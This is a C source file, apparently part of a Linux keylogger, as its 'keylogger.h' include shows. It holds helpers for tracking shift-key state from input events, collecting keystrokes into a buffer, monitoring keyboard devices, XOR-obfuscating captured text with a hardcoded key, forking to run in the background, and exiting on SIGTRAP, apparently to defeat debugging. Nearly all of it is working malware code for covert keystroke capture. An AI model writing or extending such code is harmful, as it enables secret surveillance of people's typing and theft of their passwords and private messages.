
#include "keylogger.h"

inline static bool is_shift(char code)
{
    return code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT;
}

char *encrypt(char *message)
{
    char *key = "B4N4N4";
    size_t messagelen = strlen(message);
    size_t keylen = strlen(key);
    char *encrypted = malloc(messagelen + 1);

    for(size_t i = 0; i < messagelen; i++)
        encrypted[i] = message[i] ^ key[i % keylen];
    encrypted[messagelen] = '\0';
    return encrypted;
}

bool check_if_on_shift(bool is_on_shift, struct input_event evt)
{
    if (evt.type == EV_KEY && evt.value == EV_KEY_PRESSED && is_shift(evt.code))
        is_on_shift = true;
    else if (evt.type == EV_KEY && evt.value == EV_KEY_RELEASE
            && is_shift(evt.code))
        is_on_shift = false;
    return is_on_shift;
}

char *append(char *buffer, char *to_add)
{
    size_t new_len = 0;

    if (!buffer || !(*buffer))
        return strdup(to_add);
    new_len = strlen(buffer) + strlen(to_add);
    buffer = realloc(buffer, sizeof(char) * (new_len + 1));
    buffer = strcat(buffer, to_add);
    return buffer;
}

void refresh_set(fd_set *set, int *kb)
{
    int ctr = -1;

    FD_ZERO(set);
    while (kb[++ctr] != -1)
        FD_SET(kb[ctr], set);
}

void check_pid_status(pid_t pid)
{
    if (pid < 0)
        exit(1);
    else if (pid > 0)
        exit(0);
}

void sigtrap_handler(int code)
{
    (void)code;
    exit(1);
}

void sigchild_handler(int code)
{
    (void)code;
    while (waitpid(-1, 0x0, WNOHANG) > 0);
}

